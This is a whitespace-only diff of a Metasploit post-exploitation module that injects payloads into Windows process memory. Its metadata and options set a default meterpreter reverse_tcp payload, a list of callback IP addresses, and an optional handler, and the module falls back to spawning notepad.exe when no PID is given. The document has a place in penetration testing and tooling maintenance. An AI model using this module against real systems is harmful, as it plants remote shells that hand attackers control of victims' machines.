@@ -17,19 +17,20 @@ class Metasploit3 < Msf::Post
 
 	def initialize(info={})
 		super( update_info( info,
-				'Name'          => 'Windows Manage Inject in Memory Multiple Payloads',
-				'Description'   => %q{ This module will inject in to several process a given
-					payload and connecting to a given list of IP Addresses.
-					The module works with a given lists of IP Addresses and
-					process PIDs if no PID is given it will start a the given
-					process in the advanced options and inject the selected
-					payload in to the memory of the created module.},
-				'License'       => MSF_LICENSE,
-				'Author'        => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>'],
-				'Version'       => '$Revision$',
-				'Platform'      => [ 'windows' ],
-				'SessionTypes'  => [ 'meterpreter']
-			))
+			'Name'          => 'Windows Manage Inject in Memory Multiple Payloads',
+			'Description'   => %q{ This module will inject in to several process a given
+				payload and connecting to a given list of IP Addresses.
+				The module works with a given lists of IP Addresses and
+				process PIDs if no PID is given it will start a the given
+				process in the advanced options and inject the selected
+				payload in to the memory of the created module.},
+			'License'       => MSF_LICENSE,
+			'Author'        => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>'],
+			'Version'       => '$Revision$',
+			'Platform'      => [ 'windows' ],
+			'SessionTypes'  => [ 'meterpreter']
+		))
+
 		register_options(
 			[
 				OptString.new('PAYLOAD', [false, 'Payload to inject in to process memory', "windows/meterpreter/reverse_tcp"]),
@@ -37,8 +38,8 @@ class Metasploit3 < Msf::Post
 				OptString.new('IPLIST',  [true, 'List of semicolom separated IP list.', Rex::Socket.source_address("1.2.3.4")]),
 				OptString.new('PIDLIST', [false, 'List of semicolom separated PID list.', '']),
 				OptBool.new('HANDLER',   [false, 'Start new multi/handler job on local box.', false])
-
 			], self.class)
+
 		register_advanced_options(
 			[
 				OptString.new('PROCESSNAME', [false, 'Description', 'notepad.exe'])
